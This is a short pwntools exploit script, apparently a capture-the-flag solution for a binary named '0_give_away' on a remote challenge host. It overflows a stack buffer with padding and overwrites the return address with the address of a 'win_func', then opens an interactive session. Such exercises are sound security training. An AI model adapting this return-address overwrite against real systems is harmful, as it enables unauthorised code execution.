from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./0_give_away"
HOST = "sharkyctf.xyz"
PORT = 20333 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_win = elf.symbols["win_func"]
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

def exploit():
	bufsize = 0x20+8
	payload = "A"*bufsize
	payload += p64(addr_win)	
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
